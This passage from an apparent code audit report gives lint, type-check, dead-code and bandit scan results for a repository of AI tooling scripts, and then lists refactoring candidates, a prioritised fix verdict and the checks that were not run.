| tools/wizard_app.py | 2 | **yes** |
| skills/ai-kit-spec-execute-superpowers/…/task_classification.py | 1 | no (regex gap) |
| skills/ai-kit-spec-review/ai_kit_spec/dispatch.py | 1 | no (regex gap) |

R by rule: E501 14, I001 6, E402 6, RUF100 5, E702 3, SIM105 2, SIM113 1, E741 1, RUF059 1, SIM108 1, RUF012 1.

Inside the hook's own file set, there are **12 errors on R** and **25 on main**. Main adds 13 in `tests/test_ai_kit_spec.py`: 10 E501 and 3 RUF059.

**Pylint hook** (3 files): 6 messages, all in `tools/status-line.py`:
- C0301 at `:798`, `:859`, `:2292`, `:2295`, `:2297`;
- R0914 at `:1676`.

Rated 9.98/10.

**Pylint on all of `tools` and `skills`** (informational, outside the gate): 562 messages.
- 160 of them are `import-error`, caused by skill-local `sys.path`, so they are not real.
- Of the other 402, the top files are:
  - `cst-refactor/codemod_template.py` 35;
  - `ai_kit_spec/cli.py` 33;
  - `config_doctor_checks.py` 22;
  - `wizard_app.py` 21;
  - `markdown_to_pdf.py` 21;
  - `ai_kit_spec_gsd/gsd_config.py` 18.
- The real warnings are:
  - `broad-exception-caught` 15;
  - `attribute-defined-outside-init` 11;
  - `subprocess-run-check` 5;
  - `undefined-loop-variable` 2 (`_shared/…/tool_catalog.py:280`);
  - `unspecified-encoding` 2.

**Pyright** (the pre-push include list): 5 errors, all environment-only (textual not found, because R's venv is empty). Code debt is 0.

**Vulture** (the pre-push paths): **0 findings**. Over all of `tools` and `skills`: 1 finding, `mermaid_style.py:310` unused `node_count`.

**Bandit** (`make security-scanner`, informational): 56 findings, 2 rated HIGH:
- **`setup.py:3042`** `shell=True` on a constant uv-install pipe. It asks before running and carries a comment, so it is accepted.
- **`status-line.py:1553`** SHA1, used for a cache key, not security. Adding `usedforsecurity=False` would silence it.

The MEDIUM `B604` hits on `shell=True` in `ai_kit_spec` are the code path behind finding 1.

---

## Delete, merge and split candidates (summary)

**Delete**
- 7 re-export shims (finding 14);
- `_write_json` (finding 9);
- `docs/wizard-redesign/prototypes/` (finding 17);
- main's `.planning/docs/system-one-decision-skill/scratchpad/` (finding 17);
- `docs/architecture/status-line-pipeline.md`, unless it is regenerated (finding 13);
- the hand-kept hook test lists (finding 7).

**Merge**
- the two session-start hooks (finding 15);
- `setup.py` and `config_doctor_appliers` atomic writes (finding 16);
- the duplicated `_VALID_NATIVE_RUNTIME` (finding 16);
- the 3 `ai_kit_spec` path tricks plus the rules bootstrap into one realpath bootstrap, after moving `ai_kit_spec` to `_shared` (Scope B, inference).

**Split**
- `ai_kit_spec/cli.py:main` into one handler per subcommand (finding 10).

---

Verdict: fix 1 (security: running repo-local commands) and 2 (no gate runs anywhere) first. Then 3 and 4, which make tests and installs quietly use the wrong code.

Lean: about -850 lines possible (about 190 of shipped code from findings 9 and 14–16, plus 662 lines of superseded prototype), and 0 dependencies to remove.

Not checked:
- `tests/test_install.sh` and `make e2e-docker`: not run.
- How opencode, codex, cursor and pi search for skills: not checked live.
- Finding 1 exploited with a real malicious config: not run.
- The concurrent-write race in finding 8: not reproduced.
- The GitLab remote head: timed out.
- `tools/setup.py` (3,166 lines) and `tools/config_doctor_checks.py`: I read only the write, link and prune paths, not the wizard UI logic.
- `skills/ai-kit-usage-metrics/` and the rules checkers' internal logic: covered for import structure and lint only.
